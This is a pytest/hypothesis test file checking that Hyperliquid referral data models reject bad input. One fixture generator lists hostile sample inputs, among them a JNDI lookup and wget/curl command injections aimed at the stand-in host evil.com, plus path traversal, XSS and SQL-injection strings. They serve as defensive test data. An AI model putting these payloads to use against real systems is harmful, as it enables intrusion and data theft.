"""Property-based tests for Hyperliquid raw referral models.

These tests validate critical security boundary models that process external referral data.
The models tested here are essential for referral tracking, rewards, and user relationships.

SECURITY CRITICAL: These raw models protect against:
- Malicious referral data that could manipulate reward calculations and user relationships
- Buffer overflow attacks through oversized referral structures
- Injection attacks through malformed referral codes and user addresses
- Type confusion that could bypass referral validation
- Financial precision errors in volume and reward calculations
- Referral code manipulation that could affect attribution

Property testing ensures comprehensive coverage of referral edge cases and adversarial inputs.
"""

import string
from decimal import Decimal
from typing import Any, cast

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import BaseModel, ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_referral import (
    HyperliquidRawReferralResponse,
    HyperliquidRawReferralState,
    HyperliquidRawReferredBy,
    HyperliquidRawReferrerData,
    HyperliquidRawReferrerState,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# Type alias for malicious input types to avoid long lines
MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None


# =============================================================================
# HYPOTHESIS STRATEGIES FOR REFERRAL MODEL TESTING
# =============================================================================


def _create_ethereum_address(hex_part: str) -> str:
    """Create Ethereum address with 0x prefix.

    Args:
        hex_part: Hex string without prefix.

    Returns:
        Ethereum address with 0x prefix.
    """
    return f"0x{hex_part}"


def ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum addresses.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Known valid addresses
        st.sampled_from([
            "0x5ac99df645f3414876c816caa18b2d234024b487",
            "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
            "0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9",
            "0xa0b86a33e6e8a3b1c8b4c6f9d7e8a9f4b3e2d5c1",
        ]),
        # Generated addresses
        st.builds(
            _create_ethereum_address,
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
    ])


def referral_code_strategy() -> SearchStrategy[str]:
    """Generate valid referral codes.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Common referral code patterns
        st.sampled_from([
            "TESTNET",
            "TEST",
            "MAINNET",
            "PROMO",
            "VIP",
            "BETA",
            "ALPHA",
            "EARLY",
            "SPECIAL",
            "BONUS",
            "REWARD",
            "PREMIUM",
        ]),
        # Generated codes
        st.text(
            min_size=1,
            max_size=32,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_"
            ),
        ).filter(lambda x: x.strip() and len(x.encode("utf-8")) <= 64),
    ])


def financial_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for financial amounts.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Normal decimal values
        st.decimals(
            min_value=Decimal("0.000001"),
            max_value=Decimal(10000000),
            places=6,
            allow_nan=False,
            allow_infinity=False,
        ).map(str),
        # Common edge cases
        st.just("0.000001"),
        st.just("999999.999999"),
        st.just("1.0"),
        st.just("100"),
        st.just("50000.0"),
        st.just("0.0"),
        # Scientific notation
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp values.

    Returns:
        SearchStrategy[int]: Strategy for generating test data.
    """
    return st.integers(min_value=0, max_value=2**63 - 1)


def stage_strategy() -> SearchStrategy[str]:
    """Generate valid referrer stages.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.sampled_from(["ready", "pending", "active", "inactive", "suspended"])


@st.composite
def valid_referred_by_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid referred by data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "referrer": draw(ethereum_address_strategy()),
        "code": draw(referral_code_strategy()),
    }


@st.composite
def valid_referral_state_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid referral state data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "cumVlm": draw(financial_decimal_string_strategy()),
        "cumRewardedFeesSinceReferred": draw(financial_decimal_string_strategy()),
        "cumFeesRewardedToReferrer": draw(financial_decimal_string_strategy()),
        "timeJoined": draw(timestamp_strategy()),
        "user": draw(ethereum_address_strategy()),
    }


@st.composite
def valid_referrer_data_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid referrer data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "code": draw(referral_code_strategy()),
        "referralStates": draw(st.lists(valid_referral_state_data(), min_size=0, max_size=10)),
    }


@st.composite
def valid_referrer_state_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid referrer state data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "stage": draw(stage_strategy()),
        "data": draw(valid_referrer_data_data()),
    }


@st.composite
def valid_referral_response_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid referral response data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "referredBy": draw(valid_referred_by_data()),
        "cumVlm": draw(financial_decimal_string_strategy()),
        "unclaimedRewards": draw(financial_decimal_string_strategy()),
        "claimedRewards": draw(financial_decimal_string_strategy()),
        "builderRewards": draw(financial_decimal_string_strategy()),
        "referrerState": draw(valid_referrer_state_data()),
        "rewardHistory": draw(
            st.lists(st.dictionaries(st.text(), st.text()), min_size=0, max_size=5)
        ),
    }


def malicious_referral_strategy() -> SearchStrategy[MaliciousInput]:
    """Generate malicious values for referral security testing.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Referral manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-referrals}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('referral-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE referrals;--"),
        st.just("1' UNION SELECT * FROM rewards--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("R" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.referrals.find(); //"),
        # JSON injection
        st.just('{"$where": "this.cumVlm > 1000000"}'),
        # Referral manipulation
        st.just("TEST'; UPDATE referrals SET rewards=9999;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Invalid decimal strings
        st.just("NaN"),
        st.just("Infinity"),
        st.just("-Infinity"),
        st.just("1..0"),
        st.just("not_a_number"),
        st.just(""),
        st.just("   "),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW REFERRED BY MODEL
# =============================================================================


class TestHyperliquidRawReferredByProperties:
    """Property-based tests for HyperliquidRawReferredBy validation and security."""

    @given(referred_by_data=valid_referred_by_data())
    def test_referred_by_validation_success_properties(
        self, referred_by_data: dict[str, Any]
    ) -> None:
        """Property: Valid referred by data should create valid HyperliquidRawReferredBy."""
        # Skip invalid data
        try:
            assume(
                isinstance(referred_by_data["referrer"], str)
                and referred_by_data["referrer"].strip()
            )
            assume(isinstance(referred_by_data["code"], str) and referred_by_data["code"].strip())
            # Validate Ethereum address format
            referrer = referred_by_data["referrer"]
            assume(referrer.startswith("0x") and len(referrer) == 42)
        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawReferredBy.model_validate(referred_by_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawReferredBy)

        # Property: All fields should be preserved with correct types
        assert obj.referrer == referred_by_data["referrer"]
        assert obj.code == referred_by_data["code"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["referrer", "code"]),
        malicious_value=malicious_referral_strategy(),
    )
    def test_referred_by_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Referred by model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "referrer": "0x5ac99df645f3414876c816caa18b2d234024b487",
            "code": "TESTNET",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawReferredBy.model_validate(base_data)

    @given(
        referrer_address=st.one_of([
            # Valid addresses
            ethereum_address_strategy(),
            # Invalid addresses
            st.just("invalid"),
            st.just("0x123"),  # Too short
            st.just("5ac99df645f3414876c816caa18b2d234024b487"),  # Missing 0x prefix
            st.just("0x5ac99df645f3414876c816caa18b2d234024b487z"),  # Invalid character
            st.just(""),
            st.just("   "),
        ])
    )
    def test_referred_by_address_validation_properties(self, referrer_address: str) -> None:
        """Property: Referred by model should validate Ethereum addresses."""
        referred_by_data = {
            "referrer": referrer_address,
            "code": "TESTNET",
        }

        # Check if address is valid Ethereum format
        is_valid = (
            referrer_address.strip()
            and referrer_address.startswith("0x")
            and len(referrer_address) == 42
            and all(c in string.hexdigits for c in referrer_address[2:])
        )

        if is_valid:
            # Property: Valid addresses should be accepted
            obj = HyperliquidRawReferredBy.model_validate(referred_by_data)
            assert obj.referrer == referrer_address
        else:
            # Property: Invalid addresses should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawReferredBy.model_validate(referred_by_data)

    @given(referred_by_data=valid_referred_by_data())
    def test_referred_by_extra_fields_properties(self, referred_by_data: dict[str, Any]) -> None:
        """Property: Referred by model should forbid extra fields."""
        # Skip invalid data
        try:
            assume(
                isinstance(referred_by_data["referrer"], str)
                and referred_by_data["referrer"].strip()
            )
            assume(isinstance(referred_by_data["code"], str) and referred_by_data["code"].strip())
        except (TypeError, KeyError):
            assume(False)

        # Add extra fields
        referred_by_data_with_extra = referred_by_data.copy()
        referred_by_data_with_extra["extra"] = "forbidden"
        referred_by_data_with_extra["timestamp"] = 123456789

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawReferredBy.model_validate(referred_by_data_with_extra)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW REFERRAL STATE MODEL
# =============================================================================


class TestHyperliquidRawReferralStateProperties:
    """Property-based tests for HyperliquidRawReferralState validation and security."""

    @given(referral_state_data=valid_referral_state_data())
    def test_referral_state_validation_success_properties(
        self, referral_state_data: dict[str, Any]
    ) -> None:
        """Property: Valid referral state data should create valid objects."""
        # Skip invalid data
        try:
            # Validate decimal fields
            for field in ["cumVlm", "cumRewardedFeesSinceReferred", "cumFeesRewardedToReferrer"]:
                value = referral_state_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite() and decimal_val >= 0)

            # Validate timestamp
            assume(
                isinstance(referral_state_data["timeJoined"], int)
                and referral_state_data["timeJoined"] >= 0
            )

            # Validate user address
            user = referral_state_data["user"]
            assume(isinstance(user, str) and user.startswith("0x") and len(user) == 42)

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawReferralState.model_validate(referral_state_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawReferralState)

        # Property: All fields should be preserved with correct types
        assert isinstance(obj.cum_vlm, str)
        assert isinstance(obj.cum_rewarded_fees_since_referred, str)
        assert isinstance(obj.cum_fees_rewarded_to_referrer, str)
        assert obj.time_joined == referral_state_data["timeJoined"]
        assert obj.user == referral_state_data["user"]

    @given(
        field_name=st.sampled_from([
            "cumVlm",
            "cumRewardedFeesSinceReferred",
            "cumFeesRewardedToReferrer",
            "timeJoined",
            "user",
        ]),
        malicious_value=malicious_referral_strategy(),
    )
    def test_referral_state_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Referral state model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "cumVlm": "960652.017122",
            "cumRewardedFeesSinceReferred": "196.838825",
            "cumFeesRewardedToReferrer": "19.683748",
            "timeJoined": 1679425029416,
            "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawReferralState.model_validate(base_data)

    @given(
        field_name=st.sampled_from([
            "cumVlm",
            "cumRewardedFeesSinceReferred",
            "cumFeesRewardedToReferrer",
        ]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0.000001"),
            st.just("100.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            st.just("0.0"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
            # Negative values (should be rejected)
            st.just("-100.0"),
            st.just("-0.01"),
        ]),
    )
    def test_referral_state_decimal_validation_properties(
        self, field_name: str, decimal_value: str
    ) -> None:
        """Property: Referral state decimal fields should validate properly."""
        referral_state_data = {
            "cumVlm": "960652.017122",
            "cumRewardedFeesSinceReferred": "196.838825",
            "cumFeesRewardedToReferrer": "19.683748",
            "timeJoined": 1679425029416,
            "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
        }
        referral_state_data[field_name] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()
            is_non_negative = decimal_val >= 0

            if is_finite and not is_empty and is_non_negative:
                # Property: Valid finite non-negative decimals should be accepted
                obj = HyperliquidRawReferralState.model_validate(referral_state_data)
                field_attr = (
                    field_name.replace("cumVlm", "cum_vlm")
                    .replace("cumRewardedFeesSinceReferred", "cum_rewarded_fees_since_referred")
                    .replace("cumFeesRewardedToReferrer", "cum_fees_rewarded_to_referrer")
                )
                assert isinstance(getattr(obj, field_attr), str)
            else:
                # Property: Non-finite, empty, or negative values should be rejected
                with pytest.raises((ValidationError, EmptyStringError)):
                    HyperliquidRawReferralState.model_validate(referral_state_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawReferralState.model_validate(referral_state_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW REFERRER DATA MODEL
# =============================================================================


class TestHyperliquidRawReferrerDataProperties:
    """Property-based tests for HyperliquidRawReferrerData validation and security."""

    @given(referrer_data_data=valid_referrer_data_data())
    def test_referrer_data_validation_success_properties(
        self, referrer_data_data: dict[str, Any]
    ) -> None:
        """Property: Valid referrer data should create valid objects."""
        # Skip invalid data
        try:
            assume(
                isinstance(referrer_data_data["code"], str) and referrer_data_data["code"].strip()
            )
            assume(isinstance(referrer_data_data["referralStates"], list))

            # Validate each referral state
            for state in referrer_data_data["referralStates"]:
                assume(isinstance(state, dict))
                assume("user" in state and isinstance(state["user"], str))
                if state["user"]:
                    assume(state["user"].startswith("0x") and len(state["user"]) == 42)

        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawReferrerData.model_validate(referrer_data_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawReferrerData)

        # Property: All fields should be preserved with correct types
        assert obj.code == referrer_data_data["code"]
        assert isinstance(obj.referral_states, list)
        assert len(obj.referral_states) == len(referrer_data_data["referralStates"])

    @given(
        field_name=st.sampled_from(["code", "referralStates"]),
        malicious_value=malicious_referral_strategy(),
    )
    def test_referrer_data_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Referrer data model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "code": "TEST",
            "referralStates": [
                {
                    "cumVlm": "960652.017122",
                    "cumRewardedFeesSinceReferred": "196.838825",
                    "cumFeesRewardedToReferrer": "19.683748",
                    "timeJoined": 1679425029416,
                    "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
                }
            ],
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawReferrerData.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW REFERRER STATE MODEL
# =============================================================================


class TestHyperliquidRawReferrerStateProperties:
    """Property-based tests for HyperliquidRawReferrerState validation and security."""

    @given(referrer_state_data=valid_referrer_state_data())
    def test_referrer_state_validation_success_properties(
        self, referrer_state_data: dict[str, Any]
    ) -> None:
        """Property: Valid referrer state data should create valid objects."""
        # Skip invalid data
        try:
            assume(
                isinstance(referrer_state_data["stage"], str)
                and referrer_state_data["stage"].strip()
            )
            assume(isinstance(referrer_state_data["data"], dict))
            data = referrer_state_data["data"]
            assume("code" in data and isinstance(data["code"], str) and data["code"].strip())
            assume("referralStates" in data and isinstance(data["referralStates"], list))

        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawReferrerState.model_validate(referrer_state_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawReferrerState)

        # Property: All fields should be preserved with correct types
        assert obj.stage == referrer_state_data["stage"]
        assert isinstance(obj.data, HyperliquidRawReferrerData)
        assert obj.data.code == referrer_state_data["data"]["code"]

    @given(
        field_name=st.sampled_from(["stage", "data"]),
        malicious_value=malicious_referral_strategy(),
    )
    def test_referrer_state_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Referrer state model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "stage": "ready",
            "data": {
                "code": "TEST",
                "referralStates": [
                    {
                        "cumVlm": "960652.017122",
                        "cumRewardedFeesSinceReferred": "196.838825",
                        "cumFeesRewardedToReferrer": "19.683748",
                        "timeJoined": 1679425029416,
                        "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
                    }
                ],
            },
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawReferrerState.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW REFERRAL RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawReferralResponseProperties:
    """Property-based tests for HyperliquidRawReferralResponse validation and security."""

    @given(referral_response_data=valid_referral_response_data())
    def test_referral_response_validation_success_properties(
        self, referral_response_data: dict[str, Any]
    ) -> None:
        """Property: Valid referral response data should create valid objects."""
        # Skip invalid data
        try:
            # Validate nested referred by data
            referred_by = referral_response_data["referredBy"]
            assume(isinstance(referred_by, dict))
            assume("referrer" in referred_by and isinstance(referred_by["referrer"], str))
            assume("code" in referred_by and isinstance(referred_by["code"], str))

            # Validate decimal fields
            for field in ["cumVlm", "unclaimedRewards", "claimedRewards", "builderRewards"]:
                value = referral_response_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite() and decimal_val >= 0)

            # Validate nested referrer state
            referrer_state = referral_response_data["referrerState"]
            assume(isinstance(referrer_state, dict))
            assume("stage" in referrer_state and isinstance(referrer_state["stage"], str))
            assume("data" in referrer_state and isinstance(referrer_state["data"], dict))

            # Validate reward history
            assume(isinstance(referral_response_data["rewardHistory"], list))

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawReferralResponse.model_validate(referral_response_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawReferralResponse)

        # Property: All fields should be preserved with correct types
        assert isinstance(obj.referred_by, HyperliquidRawReferredBy)
        assert isinstance(obj.cum_vlm, str)
        assert isinstance(obj.unclaimed_rewards, str)
        assert isinstance(obj.claimed_rewards, str)
        assert isinstance(obj.builder_rewards, str)
        assert isinstance(obj.referrer_state, HyperliquidRawReferrerState)
        assert isinstance(obj.reward_history, list)

    @given(
        field_name=st.sampled_from([
            "referredBy",
            "cumVlm",
            "unclaimedRewards",
            "claimedRewards",
            "builderRewards",
            "referrerState",
            "rewardHistory",
        ]),
        malicious_value=malicious_referral_strategy(),
    )
    def test_referral_response_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Referral response model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "referredBy": {
                "referrer": "0x5ac99df645f3414876c816caa18b2d234024b487",
                "code": "TESTNET",
            },
            "cumVlm": "149428030.6628420055",
            "unclaimedRewards": "11.047361",
            "claimedRewards": "22.743781",
            "builderRewards": "0.027802",
            "referrerState": {
                "stage": "ready",
                "data": {
                    "code": "TEST",
                    "referralStates": [
                        {
                            "cumVlm": "960652.017122",
                            "cumRewardedFeesSinceReferred": "196.838825",
                            "cumFeesRewardedToReferrer": "19.683748",
                            "timeJoined": 1679425029416,
                            "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
                        }
                    ],
                },
            },
            "rewardHistory": [],
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawReferralResponse.model_validate(base_data)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawReferralIntegrationProperties:
    """Integration property tests for referral models working together."""

    @given(
        referral_response_data=valid_referral_response_data(),
        malicious_value=malicious_referral_strategy(),
    )
    def test_referral_models_integration_properties(
        self, referral_response_data: dict[str, Any], malicious_value: MaliciousInput
    ) -> None:
        """Property: Referral models should work consistently together."""
        # Skip invalid data
        try:
            assume(isinstance(referral_response_data["referredBy"], dict))
            assume(isinstance(referral_response_data["referrerState"], dict))
            assume(isinstance(referral_response_data["rewardHistory"], list))
        except (TypeError, KeyError):
            assume(False)

        # Property: Valid data should create valid nested objects
        try:
            obj = HyperliquidRawReferralResponse.model_validate(referral_response_data)
            assert isinstance(obj, HyperliquidRawReferralResponse)
            assert isinstance(obj.referred_by, HyperliquidRawReferredBy)
            assert isinstance(obj.referrer_state, HyperliquidRawReferrerState)
            assert isinstance(obj.referrer_state.data, HyperliquidRawReferrerData)
        except (ValidationError, ValueError, TypeError):
            assume(False)  # Skip invalid combinations

        # Property: Malicious value should be rejected when injected into nested structure
        corrupted_data = referral_response_data.copy()
        corrupted_data["referredBy"] = corrupted_data["referredBy"].copy()
        corrupted_data["referredBy"]["code"] = malicious_value

        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawReferralResponse.model_validate(corrupted_data)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from([
                "referredBy",
                "cumVlm",
                "unclaimedRewards",
                "claimedRewards",
                "builderRewards",
                "referrerState",
                "rewardHistory",
            ]),
            malicious_referral_strategy(),
            min_size=3,
            max_size=7,
        )
    )
    def test_referral_models_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: All referral models should handle adversarial input safely."""
        # Property: Complete adversarial input should be safely rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawReferralResponse.model_validate(complete_malicious_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawReferredBy_valid() -> None:
    """Test referred by valid."""
    valid_referred_by = {
        "referrer": "0x5ac99df645f3414876c816caa18b2d234024b487",
        "code": "TESTNET",
    }
    item = HyperliquidRawReferredBy.model_validate(valid_referred_by)
    assert item.referrer == valid_referred_by["referrer"]
    assert item.code == valid_referred_by["code"]


def test_HyperliquidRawReferredBy_invalid_referrer() -> None:
    """Test referred by invalid referrer."""
    invalid_data = {
        "referrer": "invalid",
        "code": "TESTNET",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawReferredBy.model_validate(invalid_data)


def test_HyperliquidRawReferredBy_missing_code() -> None:
    """Test referred by missing code."""
    invalid_data = {
        "referrer": "0x5ac99df645f3414876c816caa18b2d234024b487",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawReferredBy.model_validate(invalid_data)


def test_HyperliquidRawReferralState_valid() -> None:
    """Test referral state valid."""
    valid_referral_state = {
        "cumVlm": "960652.017122",
        "cumRewardedFeesSinceReferred": "196.838825",
        "cumFeesRewardedToReferrer": "19.683748",
        "timeJoined": 1679425029416,
        "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
    }
    item = HyperliquidRawReferralState.model_validate(valid_referral_state)
    assert item.cum_vlm == valid_referral_state["cumVlm"]
    assert item.user == valid_referral_state["user"]


def test_HyperliquidRawReferralState_invalid_volume() -> None:
    """Test referral state invalid volume."""
    invalid_data = {
        "cumVlm": "nan",
        "cumRewardedFeesSinceReferred": "196.838825",
        "cumFeesRewardedToReferrer": "19.683748",
        "timeJoined": 1679425029416,
        "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawReferralState.model_validate(invalid_data)


def test_HyperliquidRawReferralState_invalid_timestamp() -> None:
    """Test referral state invalid timestamp."""
    invalid_data = {
        "cumVlm": "960652.017122",
        "cumRewardedFeesSinceReferred": "196.838825",
        "cumFeesRewardedToReferrer": "19.683748",
        "timeJoined": "abc",
        "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawReferralState.model_validate(invalid_data)


def test_HyperliquidRawReferrerData_valid() -> None:
    """Test referrer data valid."""
    valid_referrer_data = {
        "code": "TEST",
        "referralStates": [
            {
                "cumVlm": "960652.017122",
                "cumRewardedFeesSinceReferred": "196.838825",
                "cumFeesRewardedToReferrer": "19.683748",
                "timeJoined": 1679425029416,
                "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
            }
        ],
    }
    item = HyperliquidRawReferrerData.model_validate(valid_referrer_data)
    assert item.code == valid_referrer_data["code"]
    assert len(item.referral_states) == len(valid_referrer_data["referralStates"])


def test_HyperliquidRawReferrerData_invalid_states() -> None:
    """Test referrer data invalid states."""
    invalid_data = {
        "code": "TEST",
        "referralStates": "not-a-list",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawReferrerData.model_validate(invalid_data)


def test_HyperliquidRawReferrerState_valid() -> None:
    """Test referrer state valid."""
    valid_referrer_state = {
        "stage": "ready",
        "data": {
            "code": "TEST",
            "referralStates": [
                {
                    "cumVlm": "960652.017122",
                    "cumRewardedFeesSinceReferred": "196.838825",
                    "cumFeesRewardedToReferrer": "19.683748",
                    "timeJoined": 1679425029416,
                    "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
                }
            ],
        },
    }
    item = HyperliquidRawReferrerState.model_validate(valid_referrer_state)
    assert item.stage == valid_referrer_state["stage"]
    data_dict = cast(dict[str, Any], valid_referrer_state["data"])
    assert item.data.code == data_dict["code"]


def test_HyperliquidRawReferrerState_invalid_data() -> None:
    """Test referrer state invalid data."""
    invalid_data = {
        "stage": "ready",
        "data": "not-a-dict",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawReferrerState.model_validate(invalid_data)


def test_HyperliquidRawReferralResponse_valid() -> None:
    """Test referral response valid."""
    valid_referral_response: dict[str, Any] = {
        "referredBy": {
            "referrer": "0x5ac99df645f3414876c816caa18b2d234024b487",
            "code": "TESTNET",
        },
        "cumVlm": "149428030.6628420055",
        "unclaimedRewards": "11.047361",
        "claimedRewards": "22.743781",
        "builderRewards": "0.027802",
        "referrerState": {
            "stage": "ready",
            "data": {
                "code": "TEST",
                "referralStates": [
                    {
                        "cumVlm": "960652.017122",
                        "cumRewardedFeesSinceReferred": "196.838825",
                        "cumFeesRewardedToReferrer": "19.683748",
                        "timeJoined": 1679425029416,
                        "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
                    }
                ],
            },
        },
        "rewardHistory": [],
    }
    item = HyperliquidRawReferralResponse.model_validate(valid_referral_response)
    assert item.cum_vlm == valid_referral_response["cumVlm"]
    referred_by_dict = cast(dict[str, Any], valid_referral_response["referredBy"])
    assert item.referred_by.code == referred_by_dict["code"]
    referrer_state_dict = cast(dict[str, Any], valid_referral_response["referrerState"])
    assert item.referrer_state.stage == referrer_state_dict["stage"]
    assert item.reward_history == valid_referral_response["rewardHistory"]


def test_HyperliquidRawReferralResponse_missing_referred_by() -> None:
    """Test referral response missing referred by."""
    invalid_data: dict[str, Any] = {
        "cumVlm": "149428030.6628420055",
        "unclaimedRewards": "11.047361",
        "claimedRewards": "22.743781",
        "builderRewards": "0.027802",
        "referrerState": {
            "stage": "ready",
            "data": {
                "code": "TEST",
                "referralStates": [],
            },
        },
        "rewardHistory": [],
    }
    with pytest.raises(ValidationError):
        HyperliquidRawReferralResponse.model_validate(invalid_data)


def test_HyperliquidRawReferralResponse_invalid_volume() -> None:
    """Test referral response invalid volume."""
    invalid_data: dict[str, Any] = {
        "referredBy": {
            "referrer": "0x5ac99df645f3414876c816caa18b2d234024b487",
            "code": "TESTNET",
        },
        "cumVlm": "inf",
        "unclaimedRewards": "11.047361",
        "claimedRewards": "22.743781",
        "builderRewards": "0.027802",
        "referrerState": {
            "stage": "ready",
            "data": {
                "code": "TEST",
                "referralStates": [],
            },
        },
        "rewardHistory": [],
    }
    with pytest.raises(ValidationError):
        HyperliquidRawReferralResponse.model_validate(invalid_data)


def test_all_referral_models_extra_fields() -> None:
    """Test that all referral models forbid extra fields."""
